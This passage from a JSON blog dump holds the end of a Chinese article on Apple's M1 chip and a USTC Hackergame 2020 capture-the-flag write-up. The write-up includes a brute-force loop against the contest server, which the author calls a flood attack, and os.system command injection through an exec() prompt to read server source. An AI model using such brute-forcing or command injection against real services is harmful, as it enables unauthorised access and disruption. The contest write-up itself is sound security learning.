10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 